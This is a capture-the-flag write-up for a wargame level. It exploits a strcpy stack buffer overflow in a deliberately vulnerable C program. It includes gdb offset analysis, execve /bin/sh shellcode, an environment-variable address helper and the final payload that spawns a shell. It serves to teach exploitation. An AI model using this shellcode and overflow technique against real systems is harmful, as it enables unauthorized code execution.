# Preparation
From **previous level**, we have:
- Username: level5
- Password: ----------------- :)
- Ssh server: io.netgarage.org
# Start
`/levels/level05.c`
```cpp
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {

    char buf[128];

    if(argc < 2) return 1;

    strcpy(buf, argv[1]);

    printf("%s\n", buf);

    return 0;
}
```

Yet another buffer overflow...
## What we have:
- `strcpy` copy `argv[1]` to `buf` without checking bound
- checksec:
```
[*] '/levels/level05'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
## Exploit:
There's no `PIE` and `NX` enable, so we can easily use shellcode to get the shell.
But first, we need to find offset from our `buf` to saved `EIP` 
Starting with identical string `ABCD` as usual :))
```
(gdb) break * 0x08048419 # break at leave instruction
(gdb) run ABCD

(gdb) x/50x $esp
0xbffffb00:     0x08048524      0xbffffb20      0xb7fff920      0xb7e9ddb3
0xbffffb10:     0xbffffb3e      0x00000000      0xb7fe5110      0x00000000
0xbffffb20:     0x44434241 <-   0x00000000      0x002c307d      0x00000000
0xbffffb30:     0xb7fff000      0xb7fff920      0xbffffb50      0x0804820b
0xbffffb40:     0x00000000      0xbffffbe4      0xb7fc1000      0x00000005
0xbffffb50:     0x0177ff8e      0xb7fc1000      0xb7e19e18      0xb7fd58e8
0xbffffb60:     0xb7fc1000      0xbffffc44      0xb7ffed00      0x08048320
0xbffffb70:     0xffffffff      0x0804960c      0xbffffb88      0x08048291
0xbffffb80:     0x00000002      0xb7fc1000      0xbffffba8      0x08048489
0xbffffb90:     0xb7fc13dc      0x08048184      0x00000000      0x00000000
0xbffffba0:     0x00000002      0xb7fc1000 <-   0x00000000      0xb7e25276 <- Saved EIP
0xbffffbb0:     0x00000002      0xbffffc44      0xbffffc50      0x00000000
0xbffffbc0:     0x00000000      0x00000000
(gdb) print $ebp
$1 = (void *) 0xbffffba8
```

Our `buffer` is at `0xbffffb20` and Saved EIP at `0xbffffbac` -> Offset (140)

[Shellcode](http://shell-storm.org/shellcode/files/shellcode-827.php): `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

This stack still have ASLR and we have to careful about it. A workaround specified in `Hacking: The Art of Exploitation`, by creating shellcode inside environment variable, which is much more stable

/tmp/getenv.c
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
        }
        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
}
```

```
level5@io:/levels$ export SHELL=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
level5@io:/levels$ /tmp/a.out SHELL /levels/level05
SHELL will be at 0xbffffdf5

level5@io:/levels$ /levels/level05 $(python -c "print 'A' * 140 + '\xf5\xfd\xff\xbf'")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
sh-4.3$

```